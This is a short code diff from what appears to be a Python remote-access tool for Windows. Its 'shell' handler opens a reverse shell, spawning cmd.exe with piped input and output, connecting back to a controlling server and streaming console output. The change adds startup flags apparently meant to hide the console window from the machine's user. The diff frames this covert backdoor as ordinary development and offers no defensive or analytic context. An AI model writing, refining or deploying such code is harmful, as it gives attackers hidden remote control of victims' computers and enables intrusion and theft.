@@ -42,7 +42,9 @@ with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as sock:
             quit()
         match data[0]:
             case "shell": # Opens a reverse shell on the host to the server
-                p=subprocess.Popen(['cmd.exe'],stdin=subprocess.PIPE,stdout=subprocess.PIPE,stderr=subprocess.STDOUT)
+                startupinfo = subprocess.STARTUPINFO()
+                startupinfo.dwFlags |= subprocess.STARTF_USESHOWWINDOW
+                p=subprocess.Popen(['cmd.exe'],stdin=subprocess.PIPE,stdout=subprocess.PIPE,stderr=subprocess.STDOUT, startupinfo=startupinfo)
                 s=socket.socket()
                 s.connect((HOST, data[1])) # Connecting to the server with a shell channel
                 threading.Thread(target=exec,args=("while(True):o=os.read(p.stdout.fileno(),1024);s.send(o)",globals()),daemon=True).start() # Starting a thread to read console output
